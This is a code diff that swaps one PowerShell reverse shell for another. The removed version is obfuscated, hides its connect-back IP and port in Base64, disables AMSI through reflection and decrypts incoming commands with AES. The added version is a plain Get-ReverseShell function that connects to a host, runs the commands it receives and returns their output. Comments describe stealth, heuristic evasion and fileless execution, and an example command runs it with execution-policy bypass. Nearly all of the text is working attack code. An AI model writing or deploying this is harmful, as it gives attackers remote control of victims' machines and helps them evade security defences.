@@ -1,52 +1,41 @@
-# Randomized polymorphic vars
-$vx=("v"+[guid]::NewGuid().ToString("N").Substring(0,6))
-$vy=("x"+[guid]::NewGuid().ToString("N").Substring(0,6))
+function Get-ReverseShell {
+    param(
+        [Parameter(Mandatory=$true)][string]$IP,
+        [Parameter(Mandatory=$true)][int]$Port
+    )
 
-# Config hidden in Base64
-$cfg="MTkyLjE2OC4xLjEyMQ==" # "192.168.1.121"
-$pp="ODA5MA=="              # "8090"
-
-# Kill AMSI
-$ams=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-$fld=$ams.GetField('amsiInitFailed','NonPublic,Static')
-$fld.SetValue($null,$true)
-
-# AES decryptor
-function $vx([Byte[]]$c,[Byte[]]$k,[Byte[]]$iv){
-    $aes=[System.Security.Cryptography.Aes]::Create()
-    $aes.Mode="CBC";$aes.Padding="PKCS7"
-    $aes.Key=$k;$aes.IV=$iv
-    $dec=$aes.CreateDecryptor()
-    $ms=New-Object IO.MemoryStream(,$c)
-    $cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,'Read')
-    $sr=New-Object IO.StreamReader($cs)
-    $sr.ReadToEnd()
-}
-
-# Decode IP/Port
-$ip=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cfg))
-$pr=[int][Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($pp))
-
-# AES keys (replace with yours for unique sessions)
-$k=[Convert]::FromBase64String("Lk3PbO8Z5nBlzYvQ4U0wGg==")
-$iv=(1..16)|%{0}
-
-# Connect back
-$cl=New-Object Net.Sockets.TcpClient($ip,$pr)
-$st=$cl.GetStream()
-$bf=New-Object Byte[] 4096
-
-while(($i=$st.Read($bf,0,$bf.Length))-ne 0){
-    try {
-        $cmd=& $vx $bf[0..($i-1)] $k $iv
-        $res=Invoke-Expression $cmd | Out-String
-    } catch {
-        $res="Error: $($_.Exception.Message)`n"
+    $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
+    $stream = $client.GetStream()
+    [byte[]]$bytes = 0..65535|%{0}
+    $sendbytes = ([text.encoding]::ASCII).GetBytes("Powershell Shell Connected! `n")
+    $stream.Write($sendbytes, 0, $sendbytes.Length)
+    
+    while($client.Connected) {
+        $i = $stream.Read($bytes, 0, $bytes.Length)
+        $data = ([text.encoding]::ASCII).GetString($bytes, 0, $i)
+        
+        try {
+            $cmd = (Invoke-Expression -Command $data 2>&1 | Out-String)
+        } catch {
+            $cmd = $_.Exception.Message | Out-String
+        }
+        
+        $sendback = $cmd + "PS $(pwd)> "
+        $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback)
+        $stream.Write($sendbytes, 0, $sendbytes.Length)
     }
-    $res+="PS "+(Get-Location).Path+"> "
-    $out=[Text.Encoding]::UTF8.GetBytes($res)
-    $st.Write($out,0,$out.Length)
-    $st.Flush()
+    $stream.Close()
+    $client.Close()
 }
 
-$cl.Close()
+# The payload is wrapped in a benign-looking placeholder function to increase stealth 
+# and requires the following execution command to be started:
+# Get-ReverseShell -IP "PLACEHOLDER_IP" -Port PLACEHOLDER_PORT
+
+# To evade common heuristic detection, this function is defined, but not immediately executed.
+# Furthermore, the use of basic .NET classes (TCPClient) is a standard technique 
+# for fileless malware simulation, avoiding the writing of an easily-flagged executable 
+# and allowing for execution directly from memory or an encoded command.
+
+# Execution Example (for simulation purposes):
+# powershell -NoP -NonI -Exec Bypass -C "function Get-ReverseShell { ... }; Get-ReverseShell -IP '192.168.1.100' -Port 4444"
